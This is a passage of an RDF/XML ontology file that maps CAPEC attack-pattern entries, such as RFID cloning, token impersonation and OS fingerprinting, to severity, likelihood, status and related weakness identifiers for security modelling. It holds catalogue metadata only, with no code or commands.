                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::940::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack340">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#394">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:391::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Using a Snap Gun Lock to Force a Lock"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack330">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#531">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:534::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hardware Component Substitution"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack49">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#542">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:549::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Targeted Malware"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack289">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#535">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:531::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Gray Market Hardware"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack135">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#571">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:161::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Block Logging to Central Repository"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack318">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#200">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:207::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Removal of filters: Input filters  output filters  data masking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack225">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#399">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:395::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Cloning RFID Cards or Chips"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack333">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#128">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:153::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Integer Attacks"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::682::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack83">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#633">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:194::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Token Impersonation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::287::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic:NOTE:Integrity Alter Execution Logic By faking the source of data or services  an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges:NOTE:Integrity Gain Privileges By impersonating identities that have an increased level of access  an adversary gain privilege that they many not have otherwise had.::SCOPE:IntegrityTECHNICAL IMPACT:Hide Activities:NOTE:Integrity Hide Activities Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack70">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#309">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Network Topology Mapping"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack60">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#312">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:224::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Active OS Fingerprinting"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack168">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#296">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Information Request"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack307">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#165">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#File Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#ExecutionFlow"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack352">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#518">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:447::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Documentation Alteration to Produce Under-performing Systems"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack223">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#524">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:439::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Rogue Integration Procedures"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack93">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#175">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Code Inclusion"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack0">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#628">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:627::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Carry-Off GPS Attack"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack345">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#400">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:395::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#RFID Chip Deactivation or Destruction"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack326">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#214">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Fuzzing for garnering J2EE/.NET-based stack traces  for application mapping"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::209::388::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack313">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#114">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Authentication Abuse"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::287::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack102">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#558">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Replace Trusted Executable"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack63">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#415">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:407::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pretexting via Phone"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack167">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#331">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP IP Total Length Field Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack290">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#226">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:196::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Session Credential Falsification through Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::565::472::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack456">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#129">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Pointer Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::682::822::823::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack296">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#176">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Configuration/Environment Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::15::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack33">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#603">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:607::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Blockage"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Blocking a resource from functional operation denies its availability to authorized users.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Resource"/>
                <j.0:reduces>
